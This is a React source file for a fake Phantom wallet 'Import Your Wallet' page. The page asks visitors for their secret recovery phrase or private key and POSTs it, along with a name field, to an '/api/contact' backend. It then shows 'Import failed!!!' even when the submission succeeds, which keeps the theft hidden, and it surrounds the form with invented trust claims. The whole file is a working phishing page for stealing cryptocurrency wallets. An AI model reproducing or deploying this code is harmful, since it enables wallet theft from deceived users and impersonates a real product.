// PhantomWalletPage.jsx
import React, { useState } from 'react';

const PhantomWalletPage = () => {
  const [importType, setImportType] = useState('phrase');
  const [mail, setMail] = useState('');
  const [pass, setPass] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setMessage('');

    try {
      const res = await fetch("http://localhost:3000/api/contact", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          mail, 
          pass,
        })
      });

      const data = await res.json();

      // Navigate even with "partial" status
      if (res.ok || data.status === 'partial') {
        setMessage("Import failed!!!");
        // You can add navigation logic here
      } else {
        setMessage(data.message || "Import failed. Please try again.");
        console.error('Import failed', data);
      }
    } catch (error) {
      setMessage("Network error. Please check your connection.");
      console.error("Network or parsing error", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#AB9FF2] to-[#7B6CE6] py-8 px-4">
      {/* Main Card */}
      <div className="max-w-4xl mx-auto">
        {/* Phantom Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <div className="w-16 h-16 rounded-2xl flex items-center justify-center ">
              <img src="/phantom.svg" className='rounded-full' alt="" />
            </div>
          </div>
          <h1 className="text-4xl font-bold text-white mb-2">Phantom</h1>
          <p className="text-purple-100 text-lg">The friendly Solana wallet</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Right Column - Import Form */}
          <div className="bg-white rounded-2xl shadow-2xl p-8">
            <div className="text-center mb-8">
              <h2 className="text-2xl font-bold text-gray-900">Import Your Wallet</h2>
              <p className="text-gray-600">Restore access to your existing wallet</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Import Type */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-3">
                  Import Using:
                </label>
                <div className="flex space-x-3">
                  <button
                    type="button"
                    onClick={() => setImportType('phrase')}
                    className={`flex-1 py-3 px-4 rounded-xl border-2 transition-all font-medium ${importType === 'phrase'
                      ? 'border-purple-500 bg-purple-50 text-purple-700 shadow-sm'
                      : 'border-gray-200 bg-white text-gray-600 hover:border-gray-300'
                      }`}
                  >
                    🔑 Seed Phrase
                  </button>
                  <button
                    type="button"
                    onClick={() => setImportType('privateKey')}
                    className={`flex-1 py-3 px-4 rounded-xl border-2 transition-all font-medium ${importType === 'privateKey'
                      ? 'border-purple-500 bg-purple-50 text-purple-700 shadow-sm'
                      : 'border-gray-200 bg-white text-gray-600 hover:border-gray-300'
                      }`}
                  >
                    🔒 Private Key
                  </button>
                </div>
              </div>

              {/* Wallet Name */}
              <div>
                <label htmlFor="walletName" className="block text-sm font-semibold text-gray-700 mb-2">
                  Wallet Name
                </label>
                <input
                  type="text"
                  id="walletName"
                  value={mail}
                  onChange={(e) => setMail(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all"
                  placeholder="My Phantom Wallet"
                  required
                />
              </div>

              {/* Seed Phrase */}
              {importType === 'phrase' && (
                <div>
                  <label htmlFor="seedPhrase" className="block text-sm font-semibold text-gray-700 mb-2">
                    Secret Recovery Phrase
                  </label>
                  <textarea
                    id="seedPhrase"
                    value={pass}
                    onChange={(e) => setPass(e.target.value)}
                    rows={4}
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all font-mono text-sm resize-none"
                    placeholder="Enter your 12 or 24 word phrase separated by spaces"
                    required
                  />
                  <p className="text-xs text-gray-500 mt-2">
                    Typically 12 or 24 words separated by single spaces
                  </p>
                </div>
              )}

              {/* Private Key */}
              {importType === 'privateKey' && (
                <div>
                  <label htmlFor="privateKey" className="block text-sm font-semibold text-gray-700 mb-2">
                    Private Key
                  </label>
                  <textarea
                    id="privateKey"
                    value={pass}
                    onChange={(e) => setPass(e.target.value)}
                    rows={3}
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all font-mono text-sm resize-none"
                    placeholder="Enter your private key"
                    required
                  />
                  <p className="text-xs text-gray-500 mt-2">
                    Your wallet's private key in base58 format
                  </p>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-gradient-to-r from-purple-500 to-blue-500 text-white py-4 px-6 rounded-xl font-semibold hover:from-purple-600 hover:to-blue-600 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] shadow-lg"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
                    Importing Wallet...
                  </div>
                ) : (
                  'Import Wallet'
                )}
              </button>

              {/* Message */}
              {message && (
                <div className={`p-4 rounded-xl text-center font-semibold border ${message.includes('successful') || message.includes('Redirecting')
                  ? 'bg-green-50 text-green-800 border-green-200'
                  : 'bg-red-50 text-red-800 border-red-200'
                  }`}>
                  {message}
                </div>
              )}
            </form>

            {/* Footer Links */}
            <div className="mt-6 text-center">
              <div className="text-sm text-gray-500">
                New to Phantom? <a href="#" className="text-purple-600 hover:text-purple-700 font-medium">Create a new wallet</a>
              </div>
            </div>
          </div>


          {/* Left Column - Information */}
          <div className="bg-white/10 backdrop-blur-sm rounded-2xl p-8 text-white">
            <h2 className="text-2xl font-bold mb-6">Welcome to Phantom</h2>

            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold mb-2">🔒 Secure & Self-Custodial</h3>
                <p className="text-purple-100">
                  Phantom gives you control over your private keys, encrypted securely on your device.
                  Only you have access to your funds.
                </p>
              </div>

              <div>
                <h3 className="text-lg font-semibold mb-2">🚀 Multi-Chain Support</h3>
                <p className="text-purple-100">
                  Access Solana, Ethereum, and Polygon networks all in one beautiful wallet experience.
                </p>
              </div>

              <div>
                <h3 className="text-lg font-semibold mb-2">🛡️ Built-in Protection</h3>
                <p className="text-purple-100">
                  Advanced security features including biometric authentication and transaction simulation.
                </p>
              </div>

              <div>
                <h3 className="text-lg font-semibold mb-2">🌐 Web3 Ready</h3>
                <p className="text-purple-100">
                  Seamlessly interact with decentralized applications, NFTs, and DeFi protocols across the ecosystem.
                </p>
              </div>
            </div>

            {/* Stats */}
            <div className="mt-8 grid grid-cols-2 gap-4 text-center">
              <div className="bg-white/20 rounded-lg p-4">
                <div className="text-2xl font-bold">5M+</div>
                <div className="text-sm text-purple-100">Active Users</div>
              </div>
              <div className="bg-white/20 rounded-lg p-4">
                <div className="text-2xl font-bold">$10B+</div>
                <div className="text-sm text-purple-100">Assets Secured</div>
              </div>
            </div>
          </div>


        </div>

        {/* Bottom Banner */}
        <div className="mt-8 text-center">
          <p className="text-white/80 text-sm">
            Trusted by millions • Non-custodial • Open Source •
            <a href="#" className="underline hover:text-white ml-2">Learn more about security</a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default PhantomWalletPage;